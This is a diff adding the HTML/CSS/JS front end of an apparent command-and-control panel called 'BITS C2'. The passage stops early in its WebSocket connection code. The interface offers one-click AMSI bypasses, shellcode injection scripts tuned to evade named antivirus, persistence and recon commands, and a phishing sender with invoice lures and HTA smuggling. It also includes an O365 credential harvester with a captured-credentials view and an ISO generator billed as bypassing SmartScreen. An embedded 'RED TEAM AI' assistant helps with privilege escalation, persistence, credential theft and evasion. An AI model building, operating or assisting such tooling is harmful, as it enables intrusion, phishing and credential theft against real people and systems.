@@ -1,0 +1,2623 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>BITS C2 - CYBER + AI</title>
+    <style>
+* { margin: 0; padding: 0; box-sizing: border-box; }
+body { 
+    background: #0a0a0a; 
+    color: #ff3333; 
+    font-family: "JetBrains Mono", "Fira Code", monospace; 
+    font-size: 13px; 
+    height: 100vh; 
+    overflow: hidden; 
+}
+.container { display: flex; flex-direction: column; height: 100vh; padding: 8px; gap: 8px; }
+.top-bar { 
+    display: flex; 
+    gap: 10px; 
+    padding: 12px; 
+    background: linear-gradient(180deg, #1a1a1a, #0d0d0d); 
+    border: 1px solid #ff3333; 
+    border-radius: 8px; 
+    align-items: center; 
+}
+.target-label { 
+    color: #ff3333; 
+    font-weight: bold; 
+    padding: 8px 15px; 
+    background: #1a0000; 
+    border: 1px solid #ff3333; 
+    border-radius: 5px; 
+    min-width: 180px; 
+    text-align: center; 
+    font-size: 14px;
+}
+#cmdInput { 
+    flex: 1; 
+    background: #0d0d0d; 
+    border: 2px solid #333; 
+    color: #fff; 
+    padding: 12px 15px; 
+    font-size: 14px; 
+    border-radius: 5px; 
+}
+#cmdInput:focus { border-color: #ff3333; outline: none; box-shadow: 0 0 15px rgba(255,51,51,0.3); }
+#cmdInput:disabled { opacity: 0.5; }
+button { 
+    background: linear-gradient(180deg, #2a2a2a, #1a1a1a); 
+    border: 2px solid #ff3333; 
+    color: #ff3333; 
+    padding: 12px 25px; 
+    font-size: 14px; 
+    font-weight: bold; 
+    cursor: pointer; 
+    border-radius: 5px; 
+    transition: all 0.2s; 
+    text-transform: uppercase; 
+}
+button:hover { 
+    background: #ff3333; 
+    color: #000; 
+    box-shadow: 0 0 20px rgba(255,51,51,0.5); 
+}
+button:disabled { opacity: 0.3; cursor: not-allowed; }
+.main-area { display: flex; flex: 1; gap: 0; overflow: hidden; position: relative; }
+.sidebar { 
+    display: flex; 
+    gap: 8px; 
+    transition: width 0.3s ease, min-width 0.3s ease, opacity 0.3s ease;
+    overflow: hidden;
+}
+.sidebar.collapsed {
+    width: 0 !important;
+    min-width: 0 !important;
+    opacity: 0;
+    gap: 0;
+}
+.sidebar-toggle {
+    width: 16px;
+    min-width: 16px;
+    height: 100%;
+    background: #1a1a1a;
+    border: none;
+    border-left: 1px solid #333;
+    border-right: 1px solid #333;
+    color: #ff3333;
+    cursor: pointer;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 12px;
+    transition: all 0.2s ease;
+}
+.sidebar-toggle:hover {
+    background: #2a1a1a;
+    color: #ff5555;
+}
+.agents-panel { 
+    width: 160px;
+    min-width: 160px;
+    background: #0d0d0d; 
+    border: 1px solid #333; 
+    border-radius: 8px; 
+    display: flex; 
+    flex-direction: column; 
+}
+.panel-header { 
+    background: linear-gradient(180deg, #ff3333, #cc0000); 
+    color: #000; 
+    padding: 8px; 
+    font-weight: bold; 
+    text-align: center; 
+    font-size: 12px; 
+    border-radius: 7px 7px 0 0; 
+}
+.agents-list { flex: 1; overflow: auto; padding: 6px; }
+.agent-item { 
+    padding: 8px; 
+    margin: 4px 0; 
+    background: #1a1a1a; 
+    border: 1px solid #333; 
+    border-left: 3px solid #ff3333; 
+    cursor: pointer; 
+    border-radius: 4px; 
+    transition: all 0.2s; 
+}
+.agent-item:hover { background: #2a1a1a; border-color: #ff3333; }
+.agent-item.active { background: #2a0000; border-color: #ff3333; box-shadow: 0 0 15px rgba(255,51,51,0.3); }
+.agent-item.stale { opacity: 0.5; border-left-color: #666; }
+.agent-name { color: #ff6666; font-weight: bold; font-size: 11px; }
+.agent-time { color: #888; font-size: 10px; margin-top: 2px; }
+.no-agents { color: #666; text-align: center; padding: 20px; font-size: 11px; }
+.quick-panel { 
+    width: 200px;
+    min-width: 200px;
+    background: #0d0d0d; 
+    border: 1px solid #333; 
+    border-radius: 8px; 
+    overflow: auto; 
+}
+.quick-section { border-bottom: 1px solid #222; }
+.quick-header { 
+    background: #1a1a1a; 
+    color: #ff6666; 
+    padding: 8px; 
+    font-weight: bold; 
+    cursor: pointer; 
+    display: flex; 
+    justify-content: space-between; 
+    font-size: 11px; 
+}
+.quick-header:hover { background: #2a1a1a; }
+.quick-content { padding: 4px; display: none; }
+.quick-content.open { display: block; }
+.quick-btn { 
+    display: block; 
+    width: 100%; 
+    background: #1a1a1a; 
+    border: 1px solid #333; 
+    color: #ccc; 
+    padding: 6px 8px; 
+    margin: 2px 0; 
+    font-size: 10px; 
+    cursor: pointer; 
+    text-align: left; 
+    border-radius: 3px; 
+    transition: all 0.2s; 
+}
+.quick-btn:hover { background: #2a2a2a; border-color: #ff3333; color: #fff; }
+.quick-btn.amsi { border-left: 2px solid #ff00ff; }
+.quick-btn.inject { border-left: 2px solid #00ffff; }
+.quick-btn.recon { border-left: 2px solid #ffaa00; }
+.quick-btn.payload { border-left: 2px solid #00ff00; }
+.output-panel { min-width: 0; overflow: hidden; 
+    flex: 1; 
+    background: #0a0a0a; 
+    border: 1px solid #333; 
+    border-radius: 8px; 
+    display: flex; 
+    flex-direction: column; 
+}
+.output-header { 
+    display: flex; 
+    justify-content: space-between; 
+    align-items: center; 
+    background: linear-gradient(180deg, #ff3333, #cc0000); 
+    color: #000; 
+    padding: 10px 15px; 
+    font-weight: bold; 
+    border-radius: 7px 7px 0 0; 
+}
+.output-content { 
+    flex: 1; 
+    overflow: auto; 
+    padding: 15px; 
+    font-family: "JetBrains Mono", monospace; 
+    font-size: 13px; 
+    line-height: 1.5; 
+    background: #050505; 
+}
+.output-line { margin: 2px 0; white-space: nowrap; overflow-x: visible; }
+.output-cmd { color: #fff; }
+.output-result { color: #aaa; }
+.output-error { color: #ff4444; }
+.output-info { color: #ff6666; }
+.status-bar { 
+    display: flex; 
+    justify-content: space-between; 
+    padding: 8px 15px; 
+    background: #0d0d0d; 
+    border: 1px solid #333; 
+    border-radius: 8px; 
+    font-size: 12px; 
+}
+.status-dot { 
+    display: inline-block; 
+    width: 10px; 
+    height: 10px; 
+    border-radius: 50%; 
+    margin-right: 8px; 
+}
+.status-dot.online { background: #00ff00; box-shadow: 0 0 10px #00ff00; }
+.status-dot.offline { background: #ff0000; box-shadow: 0 0 10px #ff0000; }
+.btn-clear { 
+    background: #1a1a1a; 
+    border: 1px solid #ff3333; 
+    color: #ff3333; 
+    padding: 5px 15px; 
+    font-size: 11px; 
+}
+.btn-pty { 
+    background: linear-gradient(180deg, #6600cc, #4400aa); 
+    border: 2px solid #9933ff; 
+    color: #fff; 
+    padding: 12px 20px; 
+}
+.btn-pty:hover { box-shadow: 0 0 20px rgba(153,51,255,0.5); }
+::-webkit-scrollbar { width: 8px; }
+::-webkit-scrollbar-track { background: #0a0a0a; }
+::-webkit-scrollbar-thumb { background: #ff3333; border-radius: 4px; }
+
+/* Phishing Panel Styles */
+.phish-modal {
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background: rgba(0,0,0,0.8);
+    z-index: 1000;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+}
+.phish-panel {
+    background: #0d0d0d;
+    border: 2px solid #e74c3c;
+    border-radius: 12px;
+    width: 500px;
+    max-height: 90vh;
+    overflow: auto;
+    box-shadow: 0 0 40px rgba(231,76,60,0.3);
+}
+.phish-header {
+    background: linear-gradient(135deg, #e74c3c, #c0392b);
+    color: #fff;
+    padding: 15px 20px;
+    font-weight: bold;
+    font-size: 16px;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    border-radius: 10px 10px 0 0;
+}
+.phish-body {
+    padding: 20px;
+}
+.phish-row {
+    margin-bottom: 15px;
+}
+.phish-row label {
+    display: block;
+    color: #ff6666;
+    font-size: 12px;
+    margin-bottom: 5px;
+    font-weight: bold;
+}
+.phish-row input, .phish-row select, .phish-row textarea {
+    width: 100%;
+    background: #1a1a1a;
+    border: 1px solid #333;
+    color: #fff;
+    padding: 10px;
+    border-radius: 5px;
+    font-size: 13px;
+}
+.phish-row input:focus, .phish-row select:focus, .phish-row textarea:focus {
+    border-color: #e74c3c;
+    outline: none;
+}
+.phish-actions {
+    display: flex;
+    gap: 10px;
+    margin-top: 20px;
+}
+.phish-actions button {
+    flex: 1;
+    padding: 12px;
+    border: 1px solid #e74c3c;
+    border-radius: 5px;
+    cursor: pointer;
+    font-weight: bold;
+    color: #fff;
+}
+.phish-log {
+    margin-top: 20px;
+    border: 1px solid #333;
+    border-radius: 5px;
+    max-height: 150px;
+    overflow: auto;
+}
+.phish-log-header {
+    background: #1a1a1a;
+    padding: 8px 12px;
+    font-size: 12px;
+    color: #ff6666;
+    font-weight: bold;
+}
+#phishLogEntries {
+    padding: 10px;
+    font-size: 11px;
+}
+.phish-log-entry {
+    padding: 5px 0;
+    border-bottom: 1px solid #222;
+    color: #aaa;
+}
+.phish-log-entry.success { color: #2ecc71; }
+.phish-log-entry.error { color: #e74c3c; }
+.phish-footer {
+    background: #1a1a1a;
+    padding: 10px 20px;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    font-size: 11px;
+    color: #666;
+    border-radius: 0 0 10px 10px;
+}
+    </style>
+
+<!-- xterm.js for interactive PTY -->
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/xterm@5.3.0/css/xterm.css">
+<script src="https://cdn.jsdelivr.net/npm/xterm@5.3.0/lib/xterm.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/xterm-addon-fit@0.8.0/lib/xterm-addon-fit.min.js"></script>
+<style>
+    
+        .recon-cmd {
+            background: #112;
+            color: #0f0;
+            padding: 6px 8px;
+            margin: 2px;
+            border-radius: 3px;
+            cursor: pointer;
+            font-size: 11px;
+            font-family: monospace;
+            transition: all 0.2s;
+        }
+        .recon-cmd:hover {
+            background: #224;
+            color: #0ff;
+            transform: translateX(3px);
+        }
+
+        .pty-modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.95); z-index: 9999; }
+    .pty-modal.active { display: flex; flex-direction: column; }
+    .pty-header { background: #0f0; color: #000; padding: 8px 15px; display: flex; justify-content: space-between; align-items: center; font-weight: bold; }
+    .pty-header .status { font-size: 12px; }
+    .pty-close { background: #f00; border: none; color: #fff; padding: 5px 15px; cursor: pointer; font-weight: bold; }
+    .pty-terminal { flex: 1; padding: 10px; background: #000; overflow: hidden; margin-bottom: 40px; }
+    #ptyTerm { height: 100%; }
+    .btn-pty { background: linear-gradient(135deg, #9b59b6, #8e44ad); border: 1px solid #a855f7; color: #fff; padding: 3px 10px; font-size: 9px; cursor: pointer; margin-left: 5px; }
+    .btn-pty:hover { box-shadow: 0 0 15px rgba(168, 85, 247, 0.7); }
+    .btn-pty:disabled { opacity: 0.3; cursor: not-allowed; }
+
+    .pty-recon-tabs {
+        display: flex;
+        gap: 5px;
+        padding: 5px 10px;
+        background: #1a1a2e;
+        border-bottom: 1px solid #333;
+        flex-wrap: wrap;
+    }
+    .pty-recon-tabs button {
+        padding: 5px 10px;
+        background: #333;
+        color: #0f0;
+        border: 1px solid #444;
+        border-radius: 3px;
+        cursor: pointer;
+        font-size: 11px;
+    }
+    .pty-recon-tabs button:hover {
+        background: #444;
+        border-color: #0f0;
+    }
+    .pty-recon-tabs button.danger {
+        color: #f55;
+        border-color: #f55;
+    }
+    .pty-recon-tabs button.danger:hover {
+        background: #422;
+    }
+
+    /* AI Panel Styles */
+    .ai-panel {
+        width: 550px;
+        min-width: 450px;
+        max-width: 700px;
+        background: linear-gradient(180deg, #0d0d1a, #0a0a12);
+        border-left: 2px solid #00ffff;
+        display: flex;
+        flex-direction: column;
+        transition: width 0.2s ease, opacity 0.2s ease, min-width 0.2s ease;
+        overflow: hidden;
+        flex-shrink: 0;
+    }
+    .ai-panel.collapsed {
+        width: 0 !important;
+        min-width: 0 !important;
+        max-width: 0 !important;
+        opacity: 0;
+        border: none;
+        padding: 0;
+        pointer-events: none;
+    }
+    .ai-header {
+        background: linear-gradient(180deg, #00ffff, #0088aa);
+        color: #000;
+        padding: 10px 15px;
+        font-weight: bold;
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        font-size: 12px;
+    }
+    .ai-header .ai-model {
+        font-size: 10px;
+        background: rgba(0,0,0,0.3);
+        padding: 2px 8px;
+        border-radius: 10px;
+    }
+    .ai-chat {
+        flex: 1;
+        overflow-y: auto;
+        padding: 10px;
+        display: flex;
+        flex-direction: column;
+        gap: 10px;
+    }
+    .ai-message {
+        padding: 10px;
+        border-radius: 8px;
+        font-size: 12px;
+        line-height: 1.5;
+        max-width: 95%;
+    }
+    .ai-message.user {
+        background: #1a1a3a;
+        border: 1px solid #00ffff;
+        color: #00ffff;
+        align-self: flex-end;
+    }
+    .ai-message.assistant {
+        background: #0f1f0f;
+        border: 1px solid #00ff88;
+        color: #ddd;
+        align-self: flex-start;
+    }
+    .ai-message.system {
+        background: #2a2a0a;
+        border: 1px solid #ffaa00;
+        color: #ffaa00;
+        font-size: 11px;
+        text-align: center;
+    }
+    .ai-message pre {
+        background: #000;
+        padding: 8px;
+        border-radius: 4px;
+        overflow-x: auto;
+        font-size: 11px;
+        margin: 8px 0;
+    }
+    .ai-message code {
+        background: rgba(0,255,255,0.1);
+        padding: 2px 5px;
+        border-radius: 3px;
+        font-family: monospace;
+    }
+    .ai-input-area {
+        padding: 10px;
+        border-top: 1px solid #333;
+        display: flex;
+        gap: 8px;
+    }
+    #aiInput {
+        flex: 1;
+        background: #0d0d0d;
+        border: 1px solid #00ffff;
+        color: #fff;
+        padding: 10px;
+        border-radius: 5px;
+        font-size: 12px;
+        resize: none;
+    }
+    #aiInput:focus {
+        outline: none;
+        box-shadow: 0 0 10px rgba(0,255,255,0.3);
+    }
+    .ai-btn {
+        background: linear-gradient(180deg, #00aaaa, #008888);
+        border: 1px solid #00ffff;
+        color: #fff;
+        padding: 10px 15px;
+        border-radius: 5px;
+        cursor: pointer;
+        font-weight: bold;
+        font-size: 11px;
+    }
+    .ai-btn:hover {
+        box-shadow: 0 0 15px rgba(0,255,255,0.5);
+    }
+    .ai-btn:disabled {
+        opacity: 0.5;
+        cursor: not-allowed;
+    }
+    .ai-btn.analyze {
+        background: linear-gradient(180deg, #ff6600, #cc5500);
+        border-color: #ff8800;
+    }
+    .ai-btn.analyze:hover {
+        box-shadow: 0 0 15px rgba(255,136,0,0.5);
+    }
+    .ai-actions {
+        display: flex;
+        gap: 5px;
+        padding: 5px 10px;
+        background: #111;
+        flex-wrap: wrap;
+    }
+    .ai-actions button {
+        padding: 4px 8px;
+        font-size: 10px;
+        background: #222;
+        border: 1px solid #444;
+        color: #aaa;
+        border-radius: 3px;
+        cursor: pointer;
+    }
+    .ai-actions button:hover {
+        background: #333;
+        border-color: #00ffff;
+        color: #fff;
+    }
+    .ai-toggle {
+        position: absolute;
+        right: 0;
+        top: 50%;
+        transform: translateY(-50%);
+        width: 20px;
+        height: 60px;
+        background: #0088aa;
+        border: none;
+        color: #fff;
+        cursor: pointer;
+        border-radius: 5px 0 0 5px;
+        font-size: 10px;
+        z-index: 100;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+    }
+    .ai-toggle:hover {
+        background: #00aacc;
+    }
+    .ai-loading {
+        display: flex;
+        align-items: center;
+        gap: 8px;
+        color: #00ffff;
+        padding: 10px;
+        font-size: 11px;
+    }
+    .ai-loading .spinner {
+        width: 16px;
+        height: 16px;
+        border: 2px solid #00ffff;
+        border-top-color: transparent;
+        border-radius: 50%;
+        animation: spin 1s linear infinite;
+    }
+    @keyframes spin {
+        to { transform: rotate(360deg); }
+    }
+    
+    /* PTY Modal with AI Split View */
+    .pty-content {
+        flex: 1;
+        display: flex;
+        overflow: hidden;
+    }
+    .pty-terminal-area {
+        flex: 1;
+        display: flex;
+        flex-direction: column;
+    }
+
+</style>
+</head>
+<body>
+    <div class="matrix-bg"></div>
+    <div class="container">
+        <!-- TOP: Command Input -->
+        <div class="top-bar">
+            <span class="target-label" id="targetLabel">[ NO TARGET ]</span>
+            <input type="text" id="cmdInput" placeholder="root@c2:~$ Enter command..." disabled>
+            <button id="sendBtn" onclick="sendCommand()" disabled>EXEC</button>
+            <button onclick="clearOutput()">CLR</button><button id="ptyBtn" class="btn-pty" onclick="openPtyTerminal()">🖥️ TTY</button>
+            <button id="aiToggleMainBtn" class="btn-pty" style="background: linear-gradient(135deg, #00aaaa, #008888); border-color: #00ffff;" onclick="toggleAIPanel()">🤖 AI</button>
+        </div>
+        
+        <!-- MAIN: Agents + Quick Actions + Output -->
+        <div class="main-area">
+            <!-- Sidebar: Agents + Quick Actions -->
+            <div class="sidebar" id="sidebar">
+                <!-- Left: Agents -->
+                <div class="agents-panel">
+                    <div class="panel-header">◉ AGENTS</div>
+                    <div class="agents-list" id="agentsList">
+                        <div class="no-agents">[ WAITING ]</div>
+                    </div>
+                </div>
+            
+                <!-- Middle: Quick Actions -->
+                <div class="quick-panel">
+                    <div class="panel-header">⚡ QUICK ACTIONS</div>
+                
+                <!-- AMSI Bypass Section -->
+                <div class="quick-section">
+                    <div class="quick-header" onclick="toggleSection(this)">
+                        🛡️ AMSI BYPASS (Random) <span class="toggle">▼</span>
+                    </div>
+                    <div class="quick-content open">
+                        <button class="quick-btn amsi" onclick="sendRandomAmsi()" title="Generate random obfuscated AMSI bypass">🎲 RANDOM AMSI</button>
+                        <button class="quick-btn amsi" onclick="sendRandomAmsi()" title="Try another variation">🎲 RANDOM #2</button>
+                        <button class="quick-btn amsi" onclick="sendRandomAmsi()" title="Try another variation">🎲 RANDOM #3</button>
+                        <button class="quick-btn amsi" onclick="quickSend('amsi_hw')" title="Hardware Breakpoint">HW Breakpoint</button>
+                        <button class="quick-btn amsi" onclick="quickSend('amsi_patch')" title="Memory Patch">Mem Patch</button>
+                    </div>
+                </div>
+                
+                <!-- Recon Section -->
+                <div class="quick-section">
+                    <div class="quick-header" onclick="toggleSection(this)">
+                        🔍 RECON <span class="toggle">▶</span>
+                    </div>
+                    <div class="quick-content">
+                        <button class="quick-btn recon" onclick="quickSend('whoami')">whoami</button>
+                        <button class="quick-btn recon" onclick="quickSend('sysinfo')">systeminfo</button>
+                        <button class="quick-btn recon" onclick="quickSend('hostname')">hostname</button>
+                        <button class="quick-btn recon" onclick="quickSend('ipconfig')">ipconfig</button>
+                        <button class="quick-btn recon" onclick="quickSend('netstat')">netstat -an</button>
+                        <button class="quick-btn recon" onclick="quickSend('tasklist')">tasklist</button>
+                        <button class="quick-btn recon" onclick="quickSend('av_check')">AV Check</button>
+                        <button class="quick-btn recon" onclick="quickSend('is64bit')">[Env]::Is64Bit</button>
+                        <button class="quick-btn recon" onclick="runCyberEnum()" style="background:linear-gradient(135deg,#9b59b6,#8e44ad);font-weight:bold" title="Full CyberEnum.ps1 - runs IN MEMORY (no download)">🔓 CyberEnum</button>
+                        <button class="quick-btn recon" onclick="quickSend('persist_recon')" style="background:linear-gradient(135deg,#27ae60,#2ecc71);font-weight:bold" title="Persistence Recon">📌 Persist Recon</button>
+                    </div>
+                </div>
+                
+                <!-- Injection Section -->
+                <div class="quick-section">
+                    <div class="quick-header" onclick="toggleSection(this)">
+                        💉 INJECT (x64) <span class="toggle">▶</span>
+                    </div>
+                    <div class="quick-content">
+                        <button class="quick-btn inject" onclick="quickSend('inject_simple')">inject.ps1</button>
+                        <button class="quick-btn inject" onclick="quickSend('inject_i5')">i5.ps1 (obfuscated)</button>
+                        <button class="quick-btn inject" onclick="quickSend('inject_syscall')">i5_syscall.ps1</button>
+                        <button class="quick-btn inject" onclick="quickSend('inject_remote')">i5_syscall_remote.ps1</button>
+                        <button class="quick-btn inject" onclick="quickSend('inject_fresh')" style="background:linear-gradient(135deg,#9b59b6,#8e44ad)">🛡️ syscall_fresh (Sophos)</button>
+                    </div>
+                </div>
+                
+                <!-- ARM64 Section -->
+                <div class="quick-section">
+                    <div class="quick-header" onclick="toggleSection(this)">
+                        🍎 ARM64 <span class="toggle">▶</span>
+                    </div>
+                    <div class="quick-content">
+                        <button class="quick-btn inject" onclick="quickSend('inject_arm64')">i5_arm64.ps1</button>
+                    </div>
+                </div>
+                
+                
+                <!-- PERSISTENCE Section - CMD only commands -->
+                <div class="quick-section">
+                    <div class="quick-header" onclick="toggleSection(this)">
+                        🔒 PERSISTENCE <span class="toggle">▶</span>
+                    </div>
+                    <div class="quick-content">
+                        <button class="quick-btn info" onclick="quickSend('persist_check')">🔍 Check</button>
+                        <button class="quick-btn danger" onclick="quickSend('persist_remove')">🗑️ Remove</button>
+                        <button class="quick-btn" onclick="quickSend('clean_temp')">🧹 Clean Temp</button>
+                    </div>
+                </div>
+                
+                <!-- Custom Section -->
+                <div class="quick-section">
+                    <div class="quick-header" onclick="toggleSection(this)">
+                        📥 DOWNLOAD <span class="toggle">▶</span>
+                    </div>
+                    <div class="quick-content">
+                        <button class="quick-btn payload" onclick="quickSend('download_b')">bypass.ps1 (AMSI)</button>
+                        <button class="quick-btn payload" onclick="quickSend('download_agent')">Respawn Agent</button>
+                    </div>
+                </div>
+                
+                <!-- HTML SMUGGLING Section -->
+                <div class="quick-section">
+                    <div class="quick-header" onclick="toggleSection(this)" style="background:linear-gradient(135deg,#e74c3c,#c0392b)">
+                        📧 PHISH LINKS <span class="toggle">▶</span>
+                    </div>
+                    <div class="quick-content" style="background:#1a0a0a">
+                        <button class="quick-btn" onclick="copyHtaUrl('Invoice_2025.hta')" style="border-left:3px solid #e74c3c">📕 Invoice HTA</button>
+                        <button class="quick-btn" onclick="copyHtaUrl('Report_Q4.hta')" style="border-left:3px solid #e74c3c">📊 Report HTA</button>
+                        <button class="quick-btn" onclick="copyHtaUrl('Meeting.hta')" style="border-left:3px solid #e74c3c">📝 Meeting HTA</button>
+                        <button class="quick-btn" onclick="copyCredUrl()" style="border-left:3px solid #f39c12;background:#2a2000">🔑 O365 Login (Creds)</button>
+                    </div>
+                </div>
+                
+                <!-- CAPTURED CREDS Section -->
+                <div class="quick-section">
+                    <div class="quick-header" onclick="toggleSection(this);loadCreds()" style="background:linear-gradient(135deg,#f39c12,#e67e22)">
+                        🔑 CAPTURED CREDS <span class="toggle">▼</span>
+                    </div>
+                    <div class="quick-content open" id="credsContent" style="background:#1a1500;max-height:200px;overflow-y:auto">
+                        <div style="color:#888;padding:10px;font-size:11px">Click to load credentials...</div>
+                    </div>
+                </div>
+            </div>
+            </div><!-- end sidebar -->
+            
+            <!-- Sidebar Toggle Button - BETWEEN sidebar and output -->
+            <button class="sidebar-toggle" id="sidebarToggle" onclick="toggleSidebar()" title="Toggle Sidebar">◀</button>
+            
+            <!-- Right: Output -->
+            <div class="output-panel">
+                <div class="output-header">
+                    <span class="glow">▶ TERMINAL</span>
+                    <button class="btn-clear" onclick="clearOutput()">CLEAR</button>
+                </div>
+                <div class="output-content" id="output">
+                    <div class="output-info">[*] BITS C2 INITIALIZED</div>
+                    <div class="output-info">[*] Awaiting connection...</div>
+                </div>
+            </div>
+            
+            <!-- AI Panel (Right Side) - Main View -->
+            <div id="bitsAIPanel" class="ai-panel collapsed" style="height:100%;">
+                <div class="ai-header">
+                    <span>🤖 RED TEAM AI</span>
+                    <span class="ai-model" id="bitsAiModelBadge">Claude</span>
+                </div>
+                <div class="ai-actions">
+                    <button onclick="analyzeBitsOutput()">📊 Analyze</button>
+                    <button onclick="aiQuickActionBits('privesc')">🔓 Privesc</button>
+                    <button onclick="aiQuickActionBits('persist')">📌 Persist</button>
+                    <button onclick="aiQuickActionBits('creds')">🔑 Creds</button>
+                    <button onclick="aiQuickActionBits('evasion')">🛡️ Evasion</button>
+                    <button onclick="clearBitsAIChat()">🗑️ Clear</button>
+                </div>
+                <div class="ai-chat" id="bitsAIChat">
+                    <div class="ai-message system">🤖 AI Red Team Assistant ready. I can analyze BITS agent output and help with exploitation.</div>
+                </div>
+                <div class="ai-input-area">
+                    <textarea id="bitsAIInput" rows="2" placeholder="Ask the AI..."></textarea>
+                    <button class="ai-btn" onclick="sendBitsAIMessage()">Send</button>
+                </div>
+            </div>
+        </div>
+        
+        <!-- Phishing Panel (Floating Modal) -->
+        <div id="phishModal" class="phish-modal" style="display:none">
+            <div class="phish-panel">
+                <div class="phish-header">
+                    <span>📧 PHISHING SENDER</span>
+                    <button onclick="togglePhishPanel()" style="background:none;border:none;color:#ff6666;cursor:pointer;font-size:18px">✕</button>
+                </div>
+                <div class="phish-body">
+                    <div class="phish-row">
+                        <label>To Email:</label>
+                        <input type="email" id="phishTo" placeholder="victim@target.com">
+                    </div>
+                    <div class="phish-row">
+                        <label>Template:</label>
+                        <select id="phishTemplate" onchange="updatePhishPreview()">
+                            <option value="invoice">📄 Invoice</option>
+                            <option value="meeting">📅 Meeting Invite</option>
+                            <option value="document">📋 Shared Document</option>
+                            <option value="password">🔐 Password Reset (O365 Creds)</option>
+                            <option value="it_support">🔧 IT Support</option>
+                            <option value="custom">✏️ Custom HTML</option>
+                        </select>
+                    </div>
+                    <div class="phish-row" id="deliveryRow">
+                        <label>Delivery:</label>
+                        <select id="phishPayload">
+                            <option value="hta">📄 HTA (Shellcode Injection)</option>
+                        </select>
+                    </div>
+                    <div class="phish-row" id="credInfoRow" style="display:none">
+                        <div style="background:#1a3a2a;padding:10px;border-radius:5px;border:1px solid #27ae60;font-size:11px">
+                            <span style="color:#27ae60">🔑 Password template → O365 credential harvester</span><br>
+                            <span style="color:#888">Victim enters email + password → captured in CAPTURED CREDS</span>
+                        </div>
+                    </div>
+                    <div class="phish-row">
+                        <label>Display Name:</label>
+                        <input type="text" id="phishDisplayName" placeholder="Invoice_2025.hta" value="Invoice_2025.hta">
+                    </div>
+                    <div class="phish-row">
+                        <label>From Name:</label>
+                        <input type="text" id="phishFromName" placeholder="IT Support" value="IT Support">
+                    </div>
+                    <div class="phish-row">
+                        <label>Subject:</label>
+                        <input type="text" id="phishSubject" placeholder="Auto-generated from template">
+                    </div>
+                    <div class="phish-row" id="customHtmlRow" style="display:none">
+                        <label>Custom HTML:</label>
+                        <textarea id="phishCustomHtml" rows="4" placeholder="HTML with {smuggle_url} placeholder"></textarea>
+                    </div>
+                    <div class="phish-row">
+                        <label>Smuggle URL:</label>
+                        <input type="text" id="phishSmuggleUrl" readonly style="background:#1a1a1a">
+                        <button onclick="generateSmuggleUrl()" style="margin-left:5px;padding:5px 10px">Generate</button>
+                    </div>
+                    <div class="phish-actions">
+                        <button onclick="previewPhish()" style="background:#333">👁️ Preview</button>
+                        <button onclick="sendPhish()" style="background:linear-gradient(135deg,#e74c3c,#c0392b)">📤 Send Phish</button>
+                    </div>
+                    <div class="phish-log" id="phishLog">
+                        <div class="phish-log-header">📋 Campaign Log</div>
+                        <div id="phishLogEntries"></div>
+                    </div>
+                    
+                    <!-- ISO Generator Section -->
+                    <div style="margin-top:15px;padding-top:15px;border-top:1px solid #333">
+                        <div class="phish-log-header">💿 ISO GENERATOR (MOTW Bypass)</div>
+                        <div class="phish-row" style="margin-top:10px">
+                            <label>ISO Name:</label>
+                            <input type="text" id="isoDisplayName" placeholder="Invoice_Q4_2025.pdf" value="Invoice_Q4_2025.pdf">
+                        </div>
+                        <div class="phish-row">
+                            <label>Icon Type:</label>
+                            <select id="isoIconType">
+                                <option value="pdf">📕 PDF Document</option>
+                                <option value="doc">📄 Word Document</option>
+                                <option value="xls">📊 Excel Spreadsheet</option>
+                                <option value="txt">📝 Text File</option>
+                            </select>
+                        </div>
+                        <div class="phish-row">
+                            <button onclick="generateIso()" style="width:100%;background:linear-gradient(135deg,#9b59b6,#8e44ad);padding:10px;font-weight:bold">
+                                💿 Generate ISO (No SmartScreen!)
+                            </button>
+                        </div>
+                        <div id="isoResult" style="margin-top:10px;display:none">
+                            <div style="background:#1a1a1a;padding:10px;border-radius:5px;border:1px solid #27ae60">
+                                <div style="color:#27ae60;font-weight:bold">✓ ISO Ready!</div>
+                                <div id="isoInfo" style="color:#ccc;font-size:12px;margin-top:5px"></div>
+                                <a id="isoDownload" href="#" style="display:inline-block;margin-top:10px;background:#27ae60;color:#fff;padding:8px 15px;border-radius:5px;text-decoration:none">
+                                    ⬇️ Download ISO
+                                </a>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                <div class="phish-footer">
+                    <span id="smtpStatus">SMTP: localhost:1025 (Mailhog)</span>
+                    <button onclick="showSmtpConfig()" style="padding:3px 8px;font-size:11px">⚙️ Config</button>
+                </div>
+            </div>
+        </div>
+        
+        <!-- Phishing Panel Toggle Button -->
+        <button id="phishToggleBtn" onclick="togglePhishPanel()" style="position:fixed;bottom:60px;right:20px;background:linear-gradient(135deg,#e74c3c,#c0392b);border:2px solid #ff6666;color:#fff;padding:12px 20px;border-radius:8px;cursor:pointer;font-weight:bold;z-index:999;box-shadow:0 4px 15px rgba(231,76,60,0.4)">
+            📧 Phishing
+        </button>
+        
+        <!-- BOTTOM: Status -->
+        <div class="status-bar">
+            <span><span class="status-dot offline" id="statusDot"></span><span id="statusText">OFFLINE</span></span>
+            <span id="agentCount">BOTS: 0</span>
+        </div>
+    </div>
+
+    <script>
+        let ws = null;
+        let selectedAgent = null;
+        let agents = {};
+        let results = {};
+        
+        const output = document.getElementById('output');
+        const cmdInput = document.getElementById('cmdInput');
+        const sendBtn = document.getElementById('sendBtn');
+        const agentsList = document.getElementById('agentsList');
+        const targetLabel = document.getElementById('targetLabel');
+        const statusDot = document.getElementById('statusDot');
+        const statusText = document.getElementById('statusText');
+        const agentCount = document.getElementById('agentCount');
+        
+        function connect() {
+            const urlParams = new URLSearchParams(window.location.search);
+            // IMPORTANT: URL token ALWAYS takes priority over localStorage
+            const urlToken = urlParams.get('token');
+            let token = urlToken || localStorage.getItem('c2_token') || localStorage.getItem('token');
+
